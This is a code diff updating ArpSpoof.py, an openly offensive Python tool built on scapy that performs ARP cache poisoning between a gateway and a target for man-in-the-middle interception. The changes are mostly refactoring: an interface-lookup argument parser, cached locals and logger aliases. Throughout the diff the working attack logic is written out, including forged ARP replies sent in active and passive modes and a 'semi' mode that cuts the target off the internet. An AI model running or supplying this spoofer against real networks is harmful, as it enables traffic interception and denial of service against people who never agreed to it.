@@ -51,7 +51,7 @@ This package implements an ARP Spoofer for MIM
 [2021-12-01 22:13:06] CRITICAL (50) {__main__ - ArpSpoof.py:428} End of ARP spoofing. The ARP tables are restored.
 """
 
-__version__ = "1.0.2"
+__version__ = "1.1.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -85,14 +85,87 @@ from scapy.all import (
     AsyncSniffer,
     IFACES,
 )
-from logging import StreamHandler, Formatter, Logger
+from logging import StreamHandler, Formatter, Logger, getLogger, DEBUG, WARNING
 from argparse import ArgumentParser, Namespace
+from scapy.interfaces import NetworkInterface
+from collections.abc import Callable
 from ipaddress import ip_address
+from socket import gethostbyname
+from sys import exit, stdout
+from typing import List
 from time import sleep
-import scapy.interfaces
-import logging
-import socket
-import sys
+
+conf_iface = conf.iface
+
+
+class ScapyArguments(ArgumentParser):
+
+    """
+    This class implements ArgumentsParser with
+    interface argument and iface research.
+    """
+
+    interface_args: list = ["--interface", "-i"]
+    interface_kwargs: dict = {
+        "help": "Part of the IP, MAC or name of the interface",
+    }
+
+    def __init__(
+        self,
+        *args,
+        interface_args=interface_args,
+        interface_kwargs=interface_kwargs,
+        **kwargs,
+    ):
+        super().__init__(*args, **kwargs)
+        self.interface_args = interface_args
+        self.interface_kwargs = interface_kwargs
+        self.add_argument(*interface_args, **interface_kwargs)
+
+    def parse_args(
+        self, args: List[str] = None, namespace: Namespace = None
+    ) -> Namespace:
+
+        """
+        This function implements the iface
+        research from interface arguments.
+        """
+
+        namespace: Namespace = ArgumentParser.parse_args(self, args, namespace)
+
+        argument_name: str = max(self.interface_args, key=len)
+        for char in self.prefix_chars:
+            if char == argument_name[0]:
+                argument_name = argument_name.lstrip(char)
+                break
+
+        interface = getattr(namespace, argument_name, None)
+
+        if interface is not None:
+            interface = interface.casefold()
+
+            for temp_iface in IFACES.values():
+
+                ip = temp_iface.ip
+                mac = temp_iface.mac or ""
+                name = temp_iface.name or ""
+                network_name = temp_iface.network_name or ""
+
+                mac = mac.casefold()
+                name = name.casefold()
+                network_name = network_name.casefold()
+
+                if (
+                    (ip and interface in ip)
+                    or (mac and interface in mac)
+                    or (name and interface in name)
+                    or (network_name and interface in network_name)
+                ):
+                    namespace.iface = temp_iface
+                    return namespace
+
+        namespace.iface = conf_iface
+        return namespace
 
 
 def get_custom_logger() -> Logger:
@@ -101,7 +174,7 @@ def get_custom_logger() -> Logger:
     This function create a custom logger.
     """
 
-    logger = logging.getLogger(__name__)  # default logger.level == 0
+    logger = getLogger(__name__)  # default logger.level == 0
 
     formatter = Formatter(
         fmt=(
@@ -110,7 +183,7 @@ def get_custom_logger() -> Logger:
         ),
         datefmt="[%Y-%m-%d %H:%M:%S] ",
     )
-    stream = StreamHandler(stream=sys.stdout)
+    stream = StreamHandler(stream=stdout)
     stream.setFormatter(formatter)
 
     logger.addHandler(stream)
@@ -128,7 +201,7 @@ class SpooferARP:
         self,
         gateway: str,
         ip_spoof: str,
-        iface: scapy.interfaces.NetworkInterface = conf.iface,
+        iface: NetworkInterface = conf_iface,
         semi: bool = False,
         inter: float = 0.5,
     ):
@@ -139,38 +212,38 @@ class SpooferARP:
         self.spoof_name = ip_spoof
 
         try:
-            self.gateway = str(ip_address(gateway))
+            gateway = self.gateway = str(ip_address(gateway))
         except ValueError:
-            self.gateway = socket.gethostbyname(gateway)
+            gateway = self.gateway = gethostbyname(gateway)
 
         try:
-            self.ip_spoof = str(ip_address(ip_spoof))
+            ip_spoof = self.ip_spoof = str(ip_address(ip_spoof))
         except ValueError:
-            self.ip_spoof = socket.gethostbyname(ip_spoof)
+            ip_spoof = self.ip_spoof = gethostbyname(ip_spoof)
 
-        logger.debug("Get IP and MAC addresses...")
+        logger_debug("Get IP and MAC addresses...")
 
-        self.my_ip = iface.ip
-        self.my_mac = iface.mac
-        self.gateway_mac = getmacbyip(self.gateway, chainCC=1)
-        self.mac_spoof = getmacbyip(self.ip_spoof, chainCC=1)
+        # self.my_ip = iface.ip
+        my_mac = self.my_mac = iface.mac
+        gateway_mac = self.gateway_mac = getmacbyip(gateway, chainCC=1)
+        mac_spoof = self.mac_spoof = getmacbyip(ip_spoof, chainCC=1)
 
-        logger.info(f"Gateway: {self.gateway} {self.gateway_mac}")
-        logger.info(f"Spoof: {self.ip_spoof} {self.mac_spoof}")
+        logger_info(f"Gateway: {gateway} {gateway_mac}")
+        logger_info(f"Spoof: {ip_spoof} {mac_spoof}")
 
         self.run = True
 
-        self.spoof_gateway = Ether(dst=self.mac_spoof, src=self.my_mac) / ARP(
-            op=2, pdst=self.ip_spoof, psrc=self.gateway, hwsrc=self.my_mac
+        self.spoof_gateway = Ether(dst=mac_spoof, src=my_mac) / ARP(
+            op=2, pdst=ip_spoof, psrc=gateway, hwsrc=my_mac
         )
-        self.spoof_target = Ether(dst=self.gateway_mac, src=self.my_mac) / ARP(
+        self.spoof_target = Ether(dst=gateway_mac, src=my_mac) / ARP(
             op=2,
-            pdst=self.gateway,
-            psrc=self.ip_spoof,
-            hwsrc=self.my_mac,
+            pdst=gateway,
+            psrc=ip_spoof,
+            hwsrc=my_mac,
         )
 
-        logger.debug("The packets are built.")
+        logger_debug("The packets are built.")
 
     def active_cache_poisonning(self) -> None:
 
@@ -178,18 +251,21 @@ class SpooferARP:
         This function start active ARP cache poisonning attack.
         """
 
-        logger.warning(
+        logger_warning(
             f"Start ARP spoof between {self.gateway} ({self.gateway_mac})"
             f" and {self.ip_spoof} ({self.mac_spoof})."
         )
 
-        while self.run:
-            self.active_spoof()
-            sleep(self.inter)
+        active_spoof = self.active_spoof
+        inter = self.inter
 
-        logger.warning("End of ARP spoofing. Restore ARP tables...")
+        while self.run:
+            active_spoof()
+            sleep(inter)
+
+        logger_warning("End of ARP spoofing. Restore ARP tables...")
         self.restore()
-        logger.critical("End of ARP spoofing. The ARP tables are restored.")
+        logger_critical("End of ARP spoofing. The ARP tables are restored.")
 
     def active_spoof(self) -> None:
 
@@ -197,22 +273,26 @@ class SpooferARP:
         This function send spoofed packets in active cache poisonning attack.
         """
 
-        logger.debug("Send ARP packet to spoof gateway IP...")
+        iface = self.iface
+        gateway = self.gateway
+        ip_spoof = self.ip_spoof
+        logger_debug("Send ARP packet to spoof gateway IP...")
+
         sendp(
             self.spoof_gateway,
-            iface=self.iface,
+            iface=iface,
             verbose=0,
         )
-        logger.info(f"Spoof {self.gateway} for {self.ip_spoof}")
+        logger_info(f"Spoof {gateway} for {ip_spoof}")
 
         if not self.semi:
-            logger.debug("Send ARP packet to spoof target IP...")
+            logger_debug("Send ARP packet to spoof target IP...")
             sendp(
                 self.spoof_target,
-                iface=self.iface,
+                iface=iface,
                 verbose=0,
             )
-            logger.info(f"Spoof {self.ip_spoof} for {self.gateway}")
+            logger_info(f"Spoof {ip_spoof} for {gateway}")
 
     def passive_cache_poisonning(self, asynchronous: bool = False) -> None:
 
@@ -220,7 +300,7 @@ class SpooferARP:
         This function implements a passive cache poisonning attack.
         """
 
-        logger.warning(
+        logger_warning(
             f"Start passive ARP spoof between {self.gateway} "
             f"({self.gateway_mac}) and {self.ip_spoof} ({self.mac_spoof})."
         )
@@ -250,20 +330,22 @@ class SpooferARP:
         This function spoofs ARP in passive mode.
         """
 
-        if packet[ARP].pdst == self.gateway:
+        gateway = self.gateway
+
+        if packet[ARP].pdst == gateway:
             sendp(
                 self.spoof_gateway,
                 iface=self.iface,
                 verbose=0,
             )
-            logger.info(f"Spoof {self.gateway} for {self.ip_spoof}")
+            logger_info(f"Spoof {gateway} for {self.ip_spoof}")
         else:
             sendp(
                 self.spoof_target,
                 iface=self.iface,
                 verbose=0,
             )
-            logger.info(f"Spoof {self.ip_spoof} for {self.gateway}")
+            logger_info(f"Spoof {self.ip_spoof} for {gateway}")
 
     def filter(self, packet: Packet) -> bool:
 
@@ -272,8 +354,10 @@ class SpooferARP:
         """
 
         if packet.haslayer(ARP):
-            arp = packet.getlayer(ARP)
-            ethernet = packet.getlayer(Ether)
+            getlayer = packet.getlayer
+            arp = getlayer(ARP)
+            ethernet = getlayer(Ether)
+
             if arp.op == 1 and (
                 (ethernet.src == self.mac_spoof and arp.pdst == self.gateway)
                 or (
@@ -282,6 +366,7 @@ class SpooferARP:
                 )
             ):
                 return True
+
         return False
 
     def restore(self) -> None:
@@ -290,37 +375,43 @@ class SpooferARP:
         This function restore ARP tables after ARP cache poisonning.
         """
 
-        logger.debug("Restoring ARP tables for the target...")
+        logger_debug("Restoring ARP tables for the target...")
+        gateway_mac = self.gateway_mac
+        mac_spoof = self.mac_spoof
+        ip_spoof = self.ip_spoof
+        gateway = self.gateway
+        iface = self.iface
+
         sendp(
-            Ether(src=self.gateway_mac, dst=self.mac_spoof)
+            Ether(src=gateway_mac, dst=mac_spoof)
             / ARP(
                 op=2,
-                pdst=self.ip_spoof,
-                psrc=self.gateway,
-                hwsrc=self.gateway_mac,
+                pdst=ip_spoof,
+                psrc=gateway,
+                hwsrc=gateway_mac,
             ),
-            iface=self.iface,
+            iface=iface,
             inter=0.5,
             count=7,
             verbose=0,
         )
-        logger.debug("The target's ARP tables are restored.")
+        logger_debug("The target's ARP tables are restored.")
         if not self.semi:
-            logger.debug("Restoring ARP tables for the gateway...")
+            logger_debug("Restoring ARP tables for the gateway...")
             sendp(
-                Ether(src=self.mac_spoof, dst=self.gateway_mac)
+                Ether(src=mac_spoof, dst=gateway_mac)
                 / ARP(
                     op=2,
-                    pdst=self.gateway,
-                    psrc=self.ip_spoof,
-                    hwsrc=self.mac_spoof,
+                    pdst=gateway,
+                    psrc=ip_spoof,
+                    hwsrc=mac_spoof,
                 ),
-                iface=self.iface,
+                iface=iface,
                 inter=0.5,
                 count=7,
                 verbose=0,
             )
-            logger.debug("The gateway's ARP tables are restored.")
+            logger_debug("The gateway's ARP tables are restored.")
 
 
 def parse_args() -> Namespace:
@@ -329,34 +420,30 @@ def parse_args() -> Namespace:
     This function parses command line arguments.
     """
 
-    parser = ArgumentParser()
-    parser.add_argument("gateway", help="Gateway IP or hostname")
-    parser.add_argument("target", help="Target IP or hostname")
-    parser.add_argument(
+    parser = ScapyArguments()
+    add_argument = parser.add_argument
+    add_argument("gateway", help="Gateway IP or hostname")
+    add_argument("target", help="Target IP or hostname")
+    add_argument(
         "--verbose",
         "-v",
         help="Mode verbose (print debug message)",
         action="store_true",
     )
-    parser.add_argument(
-        "--interface",
-        "-i",
-        help="Part of the IP, MAC or name of the interface",
-    )
-    parser.add_argument(
+    add_argument(
         "--time",
         "-t",
         help="Time in seconds to sleep between sending ARP packets.",
         type=float,
         default=0.5,
     )
-    parser.add_argument(
+    add_argument(
         "--semi",
         "-s",
         help="Spoof IP of the gateway (target will lost internet connection).",
         action="store_true",
     )
-    parser.add_argument(
+    add_argument(
         "--passive",
         "-p",
         help="Passive mode (response to ARP request only)",
@@ -365,36 +452,22 @@ def parse_args() -> Namespace:
     return parser.parse_args()
 
 
-def main() -> None:
+def main() -> int:
 
     """
     This function performs a arp spoofing from the command line.
     """
 
     arguments = parse_args()
+    iface = arguments.iface
 
-    logger.setLevel(logging.DEBUG if arguments.verbose else logging.WARNING)
+    logger.setLevel(DEBUG if arguments.verbose else WARNING)
 
-    logger.debug("Logging is configured.")
+    logger_debug("Logging is configured.")
 
-    iface = conf.iface
-    if arguments.interface is not None:
-        for iface_ in IFACES.values():
-            if (
-                arguments.interface in iface_.ip
-                or arguments.interface in iface_.mac
-                or arguments.interface in iface_.network_name
-            ):
-                logger.info(
-                    "Interface argument match with "
-                    f"({iface_.ip} {iface_.mac} {iface_.name})"
-                )
-                iface = iface_
-                break
-
-    logger.info(
+    logger_info(
         f"Network interface is configured (IP: {iface.ip}, MAC:"
-        f" {iface.mac} and name: {iface.name})"
+        f" {iface.mac} and name: {iface.name} or {iface.network_name})"
     )
 
     spoofer = SpooferARP(
@@ -418,14 +491,22 @@ def main() -> None:
         if sniffer:
             sniffer.stop()
     finally:
-        logger.warning("End of ARP spoofing. Restore ARP table...")
+        logger_warning("End of ARP spoofing. Restore ARP table...")
         spoofer.restore()
-        logger.critical("End of ARP spoofing. The ARP tables are restored.")
+        logger_critical("End of ARP spoofing. The ARP tables are restored.")
+        return 0
+
+    return 1
 
 
 logger: Logger = get_custom_logger()
+logger_debug: Callable = logger.debug
+logger_info: Callable = logger.info
+logger_warning: Callable = logger.warning
+logger_error: Callable = logger.error
+logger_critical: Callable = logger.critical
+
 print(copyright)
 
 if __name__ == "__main__":
-    main()
-    sys.exit(0)
+    exit(main())
